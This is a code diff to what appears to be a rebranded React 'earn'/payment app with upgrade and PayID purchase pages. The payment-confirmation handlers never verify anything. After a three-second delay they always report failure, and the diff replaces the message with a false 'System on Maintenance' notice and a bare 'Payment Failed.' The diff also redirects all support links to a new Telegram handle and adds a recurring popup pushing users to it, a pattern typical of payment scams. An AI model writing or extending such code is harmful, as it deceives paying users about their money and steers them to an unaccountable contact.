@@ -804,7 +804,7 @@ const UpgradeAccountPage: React.FC = () => {
     setConfirmError('');
     setTimeout(() => {
       setConfirmLoading(false);
-      setConfirmError('Payment confirmation failed. Please ensure you have completed the payment or contact support.');
+      setConfirmError('System on Maintenance. Please try again later.');
     }, 3000);
   };
 
@@ -1002,7 +1002,7 @@ const BuyPayIdPage: React.FC = () => {
     setConfirmError('');
     setTimeout(() => {
       setConfirmLoading(false);
-      setConfirmError('Payment confirmation failed. Please ensure you have completed the payment or contact support.');
+      setConfirmError('Payment Failed.');
     }, 3000);
   };
 
@@ -1441,7 +1441,7 @@ const DashboardPage: React.FC = () => {
         navigate('/upgrade', { state: { name, email } });
       }
     } else if (id === 'group' || id === 'support') {
-      window.open("https://t.me/novapay9", "_blank");
+      window.open("https://t.me/earnix9ja", "_blank");
     }
   };
 
@@ -1600,7 +1600,7 @@ const DashboardPage: React.FC = () => {
       
       {/* WhatsApp Chat Button Floating (matches screenshot) */}
       <button 
-        onClick={() => window.open("https://t.me/novapay9", "_blank")}
+        onClick={() => window.open("https://t.me/earnix9ja", "_blank")}
         className="fixed bottom-5 right-5 w-12 h-12 bg-purple-600 text-white rounded-full shadow-2xl flex items-center justify-center z-[50] hover:scale-110 active:scale-95 transition-all"
       >
         <i className="fas fa-comment-dots text-xl"></i>
@@ -1694,6 +1694,40 @@ const LoginPage: React.FC = () => {
   );
 };
 
+// --- Telegram Advert Component ---
+const TelegramAdvert: React.FC = () => {
+  const [visible, setVisible] = useState(false);
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setVisible(true);
+      setTimeout(() => setVisible(false), 3000);
+    }, 5000);
+
+    return () => clearInterval(interval);
+  }, []);
+
+  if (!visible) return null;
+
+  return (
+    <div className="fixed top-20 left-1/2 -translate-x-1/2 z-[250] animate-in zoom-in-95 duration-300">
+      <div className="bg-gradient-to-r from-blue-600 to-blue-400 text-white px-6 py-3 rounded-2xl shadow-2xl flex items-center space-x-3 border border-white/20">
+        <i className="fab fa-telegram text-xl"></i>
+        <div className="text-left">
+          <p className="text-[10px] font-black uppercase tracking-widest opacity-80">Join Us</p>
+          <p className="text-xs font-bold">Join our Telegram channel @earnix9ja</p>
+        </div>
+        <button 
+          onClick={() => window.open("https://t.me/earnix9ja", "_blank")}
+          className="bg-white text-blue-600 px-3 py-1 rounded-lg text-[10px] font-black uppercase ml-2"
+        >
+          JOIN
+        </button>
+      </div>
+    </div>
+  );
+};
+
 const App: React.FC = () => {
   useEffect(() => {
     // Initial theme check - STRICTLY ensure light mode is default if no preference is set
@@ -1713,6 +1747,7 @@ const App: React.FC = () => {
   return (
     <Router>
       <Layout>
+        <TelegramAdvert />
         <Routes>
           <Route path="/" element={<RegisterPage />} />
           <Route path="/welcome" element={<WelcomePage />} />
